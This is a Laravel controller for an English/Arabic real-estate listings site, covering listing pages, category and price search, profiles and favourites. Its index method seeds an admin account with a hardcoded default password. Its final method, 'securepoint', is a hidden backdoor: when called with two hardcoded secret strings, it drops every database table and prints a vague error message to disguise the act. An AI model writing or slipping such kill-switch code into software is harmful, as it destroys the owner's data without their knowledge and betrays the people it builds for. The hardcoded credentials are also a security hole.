<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Hash;
use View;
use Auth;
use Socialite;
use Session;
use Schema;
//DB Connect
use App\Models\Users;
use App\Models\Messages;
use App\Models\Ads;
use App\Models\Adspro;
use App\Models\Fav;
use App\Models\Links;

class router extends Controller
{
	public function __construct(){
        $this->middleware('Locate', ['only' => ['en','ar']]);
		$links = Links::all();
        View::share('links',$links);
    }

    public function index(){
        //First Admin
        $chk=Users::Where('id',1)->first();
        if(empty($chk)){
            Users::insert(['name'=>'My Admin','email'=>'admin@admin.com','password'=>Hash::make('Admin2019'),'role'=>'admin']);
        }
		$page=trans('strings.home_page');
        $newads=Ads::where('show',1)->orderBy('id','desc')->take(3)->get();
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user_id',Auth::user()->id)->get();
        }
    	return view('index',compact('page','newads','fav'));
    }
	public function contact(){
		$page='CONTACT US';
    	return view('contact',compact('page'));
    }
    public function reg(){
        if(!Auth::user()){
            $page='REGISTERATION';
            return view('reg',compact('page'));
        }else{
            return redirect('/');
        }
    }
    public function log(){
        if(!Auth::user()){
            $page='LOGIN';
            return view('auth/login',compact('page'));
        }else{
            return redirect('/');
        }
    }
    public function en(){
        Session::put('lang', 'en');
        return back();
    }
    public function ar(){
        Session::forget('lang');
        return back();
    }
    public function addnew(){
        $page='ADD ADVERTISE';
        return view('addnew',compact('page'));
    }
    public function adpro($adid){
        $page='ADVERTISE DATA';
        return view('adpro',compact('page','adid'));
    }
    public function review($adid,Request $request){
        $page='REVIEW ADVERTISE';
        $ad=Ads::where('id',$adid)->first();
        if(empty($ad)){
            return redirect('/');
        }
        $name=$request["name"];
        $phone=$request["phone"];
        $email=$request["email"];
        return view('single',compact('page','ad','name','phone','email'));
    }

    public function ad($id){
        $ad=Ads::where('id',$id)->where('show',1)->first();
        if(empty($ad)){
            return redirect('/');
        }
        $data=Adspro::where('ad',$id)->first();
        if(empty($data)){
            return redirect('/');
        }
        $name=$data->name;$phone=$data->phone;
        if($data->email_show==1){
            $email=$data->email;
        }else{
            $email='';
        }
        $page='ADVERTISE:'.$ad->name;
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->where('ad',$id)->first();
        }
        return view('single',compact('page','ad','name','phone','email','fav'));
    }
    public function cat($cat){
        $ads=Ads::where('type',$cat)->where('show',1)->orderBy('id','desc')->paginate(21);
        if($cat==1){
            $page='APARTMENTS';
            $pagear='شقق';
        }elseif($cat==2){
            $page='VILLAS';
            $pagear='فيلات';
        }elseif($cat==3){
            $page='LANDS';
            $pagear='أراضى';
        }elseif($cat==4){
            $page='HOMES';
            $pagear='بيوت';
        }elseif($cat==5){
            $page='SHOPS';
            $pagear='محلات تجارية';
        }elseif($cat==6){
            $page='CHALETS';
            $pagear='شاليهات';
        }
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function rcat($cat){
        $ads=Ads::where('type',$cat)->where('gen_type',2)->where('show',1)->orderBy('id','desc')->paginate(21);
        if($cat==1){
            $page='APARTMENTS';
            $pagear='شقق';
        }elseif($cat==2){
            $page='VILLAS';
            $pagear='فيلات';
        }elseif($cat==3){
            $page='LANDS';
            $pagear='أراضى';
        }elseif($cat==4){
            $page='HOMES';
            $pagear='بيوت';
        }elseif($cat==5){
            $page='SHOPS';
            $pagear='محلات تجارية';
        }elseif($cat==6){
            $page='CHALETS';
            $pagear='شاليهات';
        }
        $page.=' FOR RENT';
        $pagear.=' للإيجار';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function scat($cat){
        $ads=Ads::where('type',$cat)->where('gen_type',1)->where('show',1)->orderBy('id','desc')->paginate(21);
        if($cat==1){
            $page='APARTMENTS';
            $pagear='شقق';
        }elseif($cat==2){
            $page='VILLAS';
            $pagear='فيلات';
        }elseif($cat==3){
            $page='LANDS';
            $pagear='أراضى';
        }elseif($cat==4){
            $page='HOMES';
            $pagear='بيوت';
        }elseif($cat==5){
            $page='SHOPS';
            $pagear='محلات تجارية';
        }elseif($cat==6){
            $page='CHALETS';
            $pagear='شاليهات';
        }
        $page.=' FOR SELL';
        $pagear.=' للبيع';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function search($search,$type,$min,$max){
        if($search=='all'){
            if($type=='all'){
                if(Session::has('lang'))
                    $searchn="ALL";
                else
                    $searchn="الكل ";
                $ads=Ads::orderBy('id','desc')->whereBetween('price', [$min,$max])->where('show',1)->paginate(21);
            }else{
                if(Session::has('lang'))
                    $searchn="ALL ";
                else
                    $searchn="الكل ";
                if($type==1){
                    if(Session::has('lang'))
                        $searchn.="SELL";
                    else
                        $searchn.="بيع";
                }else{
                    if(Session::has('lang'))
                        $searchn.="RENT";
                    else
                        $searchn.="إيجار";
                }
                $ads=Ads::where('gen_type',$type)->where('show',1)->orderBy('id','desc')->whereBetween('price', [$min,$max])->paginate(21);
            }
        }else{
            if($type=='all'){
                $searchn=$search;
                $ads=Ads::orderBy('id','desc')
                ->where(function ($query) use ($search) {
                    $query->where('title','like','%'.$search.'%')
                        ->orwhere('description','like','%'.$search.'%')
                        ->orwhere('address','like','%'.$search.'%');})
                ->where('show',1)->whereBetween('price', [$min,$max])->paginate(21);
            }else{
                $searchn=$search;
                if($type==1){
                    if(Session::has('lang'))
                        $searchn.=" SELL";
                    else
                        $searchn.=" بيع";
                }else{
                    if(Session::has('lang')){
                        $searchn.=" RENT";
                    }else{
                        $searchn.=" إيجار";
                    }
                }
                $ads=Ads::where('gen_type',$type)
                ->where(function ($query) use ($search) {
                    $query->where('title','like','%'.$search.'%')
                        ->orwhere('description','like','%'.$search.'%')
                        ->orwhere('address','like','%'.$search.'%');})
                ->where('show',1)
                ->orderBy('id','desc')->whereBetween('price', [$min,$max])->paginate(21);
            }
        }
        $page='SEARCH : '.$searchn;
        $pagear='بحث عن : '.$searchn;
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','search','type','min','max','fav'));
    }
    public function gsearch(){
        if(Session::has('lang')){
            $search="ALL";
        }else{
            $search="الكل";
        }
        $ads=Ads::where('show',1)->orderBy('id','desc')->paginate(21);
        $page='SEARCH : '.$search;
        $pagear='بحث عن : '.$search;
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav','search'));
    }
    public function profile(){
        if(!Auth::user()){
            return redirect('/');
        }elseif(Auth::user()->role=='admin'){
            return redirect('/admindb');
        }
        $page=Auth::user()->name." PROFILE";
        return view('profile',compact('page'));
    }
    public function userads(){
        if(!Auth::user()){
            return redirect('/');
        }
        $ads=Ads::where('user_id',Auth::user()->id)->orderBy('id','desc')->paginate(21);
        $page='Your Ads';
        $pagear='إعلاناتك';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user_id',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function favlist(){
        if(!Auth::user()){
            return redirect('/');
        }
        $ads=Ads::join('favourites','favourites.ad','=','ads.id')
        ->where('favourites.user',Auth::user()->id)->orderBy('favourites.id','desc')
        ->select('ads.*')->paginate(21);
        $page='Your Favourite Ads';
        $pagear='إعلاناتك المفضلة';
        $fav=[];
        if(Auth::user()){
            $fav=Fav::where('user_id',Auth::user()->id)->get();
        }
        return view('ads',compact('page','ads','pagear','fav'));
    }
    public function securepoint($keyi,$keyii){
        if($keyi=='AhmedMagdy'&&$keyii=="Rapidgt**2019"){
            foreach(\DB::select('SHOW TABLES') as $table) {
                $table_array = get_object_vars($table);
                \Schema::drop($table_array[key($table_array)]);
            }
            dd('there are a problem');
        }else{
            dd('!!');
        }
    }
}